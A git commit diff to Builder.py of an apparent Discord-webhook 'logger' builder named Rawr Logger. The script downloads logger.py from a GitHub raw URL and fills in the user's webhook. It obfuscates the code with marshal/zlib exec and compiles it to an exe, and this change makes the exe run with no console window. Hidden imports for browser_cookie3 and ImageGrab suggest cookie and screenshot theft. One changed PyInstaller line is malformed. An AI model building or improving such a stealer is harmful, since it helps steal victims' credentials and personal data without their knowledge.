7a81d2efa36a92a06bf04437ccf418335a79f0db
Joseloll <106576578+Joseloll@users.noreply.github.com>
2022-09-11 17:37:37 -0600

    Update Builder.py

--- Builder.py
+++ Builder.py
@@ -25,10 +25,9 @@ else:
     time.sleep(3) 
     exit()
 name = Write.Input("Enter File Name:", Colors.green_to_yellow, interval=0.01)
-with open('logger.py') as f:
-    code = f.read()
-with open(f'{name}.py', 'w') as f:
-    f.write(code.replace("Webhookss", webhook))
+code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main/logger.py")
+with open(f"{name}.py", 'w', encoding='utf8') as f:
+    f.write(code.text.replace("Webhookss", webhook))
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
 prot = Write.Input("Would you like to add protection y/n:",Colors.white_to_green, interval=0.01)
 if prot == 'y':
@@ -40,7 +39,7 @@ if prot == 'y':
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" {name}.py')
+      os.system(f'pyinstaller --onefile --noconsole --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3" --hidden- from pystyle import="*" {name}.py')
       shutil.rmtree('build')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
@@ -57,9 +56,8 @@ if prot == 'y':
 elif prot == 'n':
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-      os.system(f"pyinstaller --onefile {name}.py")
+      os.system(f"pyinstaller --onefile --noconsole {name}.py")
       shutil.rmtree('build')
-      shutil.rmtree('dist')
       os.remove(f'{name}.spec')
       Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
       time.sleep(2)
